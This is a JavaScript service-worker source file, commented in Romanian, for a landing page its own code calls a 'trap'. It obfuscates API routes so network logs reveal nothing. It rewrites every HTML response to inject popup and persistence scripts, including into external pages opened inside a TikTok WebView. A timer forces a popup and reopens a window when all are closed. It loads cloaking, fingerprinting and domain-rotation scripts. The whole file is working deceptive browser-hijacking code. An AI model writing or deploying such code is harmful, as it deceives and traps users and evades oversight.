// sw.js v3 — injector dinamic + route obfuscation + heartbeat mutual cu worker-timer
var CACHE_NAME = 'trap-v3';
var STATIC_ASSETS = [
  '/',
  '/css/lander.css',
  '/js/fingerprint.js',
  '/js/uid.js',
  '/js/frequency.js',
  '/js/ab.js',
  '/js/geo.js',
  '/js/params.js',
  '/js/redirect.js',
  '/js/analytics.js',
  '/js/cloak.js',
  '/js/timer.js',
  '/js/popup.js',
  '/js/lander.js',
  '/js/persistence.js',
  '/js/ios-popup.js',
  '/js/domain-rotation.js'
];

// Route obfuscation map (ID 15)
// URL-urile scurte apar în network logs — nu sugerează nimic
var ROUTE_MAP = {
  '/p':  '/popup/index.html',
  '/c':  '/api/claim',
  '/h':  '/api/health',
  '/e':  '/api/event',
  '/v':  '/api/visit'
};

var bc;
try { bc = new BroadcastChannel('trap_ch'); } catch(e) {}

var timerFired = false;
var timerStart = null;
var timerDelay = 20000;
var timerIv = null;

// Heartbeat state (ID 6)
var lastWorkerPing = 0;
var HEARTBEAT_TIMEOUT = 25000; // dacă worker-ul nu ping-uiește în 25s, SW face check singur

// --- Install ---
self.addEventListener('install', function(e) {
  e.waitUntil(
    caches.open(CACHE_NAME).then(function(cache) {
      return cache.addAll(STATIC_ASSETS).catch(function() {});
    }).then(function() {
      return self.skipWaiting();
    })
  );
});

// --- Activate ---
self.addEventListener('activate', function(e) {
  e.waitUntil(
    caches.keys().then(function(keys) {
      return Promise.all(
        keys.filter(function(k) { return k !== CACHE_NAME; })
            .map(function(k) { return caches.delete(k); })
      );
    }).then(function() {
      return self.clients.claim();
    })
  );
});

// --- Fetch: route obfuscation + cache-first + HTML injector (ID 15 + ID 23) ---
self.addEventListener('fetch', function(e) {
  var url = new URL(e.request.url);
  var path = url.pathname;

  // Route obfuscation: /p → /popup/index.html etc.
  if (ROUTE_MAP[path]) {
    var mapped = new Request(url.origin + ROUTE_MAP[path], e.request);
    e.respondWith(fetch(mapped));
    return;
  }

  // Nu cache-uim /api/ și rute obfuscate
  if (path.startsWith('/api/') || path === '/c' || path === '/e' || path === '/v') return;

  e.respondWith(
    caches.match(e.request).then(function(cached) {
      return cached || fetch(e.request).then(function(resp) {
        if (!resp || resp.status !== 200 || resp.type === 'opaque') return resp;

        var ct = resp.headers.get('Content-Type') || '';

        // HTML Injector (ID 23): injectează script-ul nostru în orice pagină HTML
        // Util când TikTok WebView navighează la pagini externe — popup poate apărea acolo
        if (ct.includes('text/html')) {
          return resp.text().then(function(html) {
            // injectăm doar dacă nu e deja injectat
            if (!html.includes('__trap_injected')) {
              var inject = [
                '<script>window.__trap_injected=1;</script>',
                '<script src="/js/uid.js"></script>',
                '<script src="/js/params.js"></script>',
                '<script src="/js/timer.js"></script>',
                '<script src="/js/popup.js"></script>',
                '<script src="/js/persistence.js"></script>'
              ].join('');
              html = html.replace('</body>', inject + '</body>');
            }
            var headers = new Headers(resp.headers);
            headers.set('Cache-Control', 'no-store');
            return new Response(html, { status: resp.status, headers: headers });
          });
        }

        // Cache assets statice
        var clone = resp.clone();
        caches.open(CACHE_NAME).then(function(cache) {
          cache.put(e.request, clone);
        });
        return resp;
      }).catch(function() {
        return new Response('', { status: 503 });
      });
    })
  );
});

// --- Message handler: timer + heartbeat (ID 6) ---
self.addEventListener('message', function(e) {
  var data = e.data;
  if (!data) return;

  if (data.type === 'timer_start') {
    timerStart = Date.now();
    timerDelay = data.delay || 20000;
    timerFired = false;
    if (timerIv) clearInterval(timerIv);
    timerIv = setInterval(checkTimer, 500);
  }

  if (data.type === 'timer_reset') {
    timerStart = Date.now();
    timerFired = false;
  }

  // Heartbeat ping de la worker-timer.js (ID 6)
  if (data.type === 'ping') {
    lastWorkerPing = Date.now();

    // Verificăm dacă e timpul de fire (worker ne trimite elapsed)
    if (data.elapsed !== undefined && timerDelay > 0 && data.elapsed >= timerDelay) {
      if (!timerFired) {
        timerFired = true;
        firePopup();
      }
    }

    // Răspundem cu pong — ține worker-ul informat că SW e viu
    if (e.source) {
      e.source.postMessage({
        type: 'pong',
        elapsed: timerStart ? Date.now() - timerStart : 0,
        delay: timerDelay,
        fired: timerFired,
        ts: Date.now()
      });
    }
  }

  if (data.type === 'query') {
    if (e.source) {
      e.source.postMessage({
        type: 'status',
        timerStart: timerStart,
        timerDelay: timerDelay,
        timerFired: timerFired,
        elapsed: timerStart ? Date.now() - timerStart : 0
      });
    }
  }
});

function checkTimer() {
  if (timerFired || !timerStart) return;

  // Verifică dacă worker-ul e mort (nu a mai ping-uit de HEARTBEAT_TIMEOUT ms)
  var now = Date.now();
  if (lastWorkerPing > 0 && (now - lastWorkerPing) > HEARTBEAT_TIMEOUT) {
    // Worker mort — SW preia controlul timerului
  }

  var elapsed = now - timerStart;
  if (elapsed >= timerDelay) {
    timerFired = true;
    clearInterval(timerIv);
    firePopup();
  }
}

function firePopup() {
  self.clients.matchAll({ type: 'window', includeUncontrolled: true }).then(function(clients) {
    clients.forEach(function(client) {
      client.postMessage('fire');
    });
  });
  if (bc) {
    try { bc.postMessage('fire'); } catch(e) {}
  }
  setTimeout(function() {
    self.clients.matchAll({ type: 'window' }).then(function(clients) {
      if (clients.length === 0) {
        self.clients.openWindow('/').catch(function() {});
      }
    });
  }, 1000);
}
